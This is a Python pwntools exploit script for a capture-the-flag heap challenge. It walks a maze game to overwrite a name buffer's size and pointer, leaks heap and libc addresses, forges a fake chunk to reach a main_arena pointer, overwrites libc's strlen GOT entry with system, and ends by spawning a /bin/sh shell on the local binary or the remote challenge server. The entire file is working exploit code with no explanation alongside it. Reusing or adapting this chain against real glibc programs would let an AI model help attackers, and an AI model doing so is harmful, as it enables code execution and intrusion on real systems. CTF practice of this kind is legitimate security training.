#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "game-51463dfee2ff6388.brics-ctf.ru"
PORT =  13001
PROCESS = "./vuln"

def go_maze():
    r.sendline("1")
    r.recvuntil("portal)\n")

def edit_maze(w, h, maze_data, portals, start_pos):
    r.sendline("e")
    r.sendlineafter(": ", str(w))
    r.sendlineafter(": ", str(h))
    r.recvline()
    for line in maze_data:
        r.sendline(line)
    r.sendlineafter(": ", str(len(portals)))
    for portal in portals:
        r.sendlineafter(": ", portal)
    r.sendlineafter(": ", start_pos)
    r.recvuntil("portal)\n")

def quit():
    r.sendline("q")
    r.recvuntil("> ")

def go_cards():
    r.sendline("2")
    r.recvuntil("You: ")

def go(direction):
    r.sendline(direction)
    r.recvuntil("portal)\n")

def exploit(r):
    r.sendafter(": ", "\x20"*24)
    r.recvuntil("> ")
    
    log.info("Rewrite maze to get a teleporter to leave maze to north")

    maze = []
    maze.append("######## #######")
    for i in range(2):
        maze.append("#              #")
    maze.append("######## ########")

    go_maze()
    
    edit_maze(4, 16, maze, ["1 1 0 8"], "2 1")
    
    log.info("Overwrite name size")

    go("w")
    go("w")
    go("w")
    go("w")
    for i in range(7):
        go("a")
    go("w")
    go("w")     
    
    log.info("Overwrite name pointer lsb")

    go("s")
    for i in range(7):
        go("d")

    go("w")
    quit()

    log.info("Leak heap from name")

    r.sendline("3")
    r.sendafter(": ", "y")
    r.sendafter(": ", "A"*0x78)
    r.recvuntil("> ")

    r.sendline("3")
    r.recvuntil("Name: "+"A"*0x78)
    LEAK = u64(r.recvline()[:-1].ljust(8, "\x00"))
    HEAPBASE = LEAK - 0x240

    log.info("HEAP leak        : %s" % hex(LEAK))
    log.info("HEAP base        : %s" % hex(HEAPBASE))

    log.info("Point name to tcache arena")

    payload = "A"*0x78
    payload += p64(HEAPBASE+0x10)

    r.sendlineafter("(y/n) : ", "y")
    r.sendlineafter(": ", payload)    
    r.recvuntil("> ")
    
    log.info("Fillup heap to get enough chunks to free into bin")

    payload = p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)

    r.sendline("3")
    r.sendlineafter("(y/n) : ", "y")

    r.sendlineafter(": ", payload)
    
    r.recvuntil("> ")
    go_cards()
    quit()

    r.sendline("3")
    r.sendlineafter("(y/n) : ", "y")

    r.sendlineafter(": ", payload)
    r.recvuntil("> ")
    go_cards()
    quit()

    r.sendline("3")
    r.sendlineafter("(y/n) : ", "y")

    r.sendlineafter(": ", payload)
    r.recvuntil("> ")   
    go_cards()
    quit()

    log.info("Free fake bin chunk to get mainarena pointer")

    payload = p64(0x0000000000000001)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(HEAPBASE+0x250)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x000000000000000a)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x0000000000000000)+p64(0x0000000000000000)
    payload += p64(0x4141414141414141)+p64(0x481)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414441414141)
    payload += p64(0x4141414141414141)+p64(HEAPBASE+0x250)

    r.sendline("3")
    r.sendlineafter("(y/n) : ", "y")

    r.sendlineafter(": ", payload)
    r.recvuntil("> ")   

    go_cards()
    quit()

    log.info("Leak mainarena pointer")

    r.sendline("3")
    r.recvuntil("Name: ")
    LIBCLEAK = u64(r.recvline()[:-1].ljust(8, "\x00"))
    libc.address = LIBCLEAK - 0x219ce0

    log.info("LIBC leak       : %s" % hex(LIBCLEAK))
    log.info("LIBC            : %s" % hex(libc.address))

    log.info("Overwrite strlen abs.got")
    STRLENGOT = libc.address + 0x219098

    payload = p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414141414141)
    payload += p64(0x4141414141414141)+p64(0x4141414441414141)
    payload += p64(0x10)+p64(STRLENGOT-8)
    
    r.sendlineafter(": ", "y")
    r.sendlineafter(": ", payload)
    r.recvuntil("> ")

    r.sendline("3")
    r.sendlineafter("(y/n) : ", "y")

    payload = "/bin/sh\x00" + p64(libc.symbols["system"])

    r.sendafter(": ", payload)

    r.recvuntil("> ")

    log.info("Show name to trigger shell")
    r.sendline("3")
    r.interactive()

    return


if __name__ == "__main__":
    # e = ELF("./vuln")
    libc = ELF("./libc.so.6")
    context.terminal = ["tmux", "splitw", "-v"]

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./vuln")
        # r = gdb.debug("./vuln", """
        #    source ~/Tools/.gdbinit-gef
        #    continue
        # """)
        print(util.proc.pidof(r))
        pause()

    exploit(r)
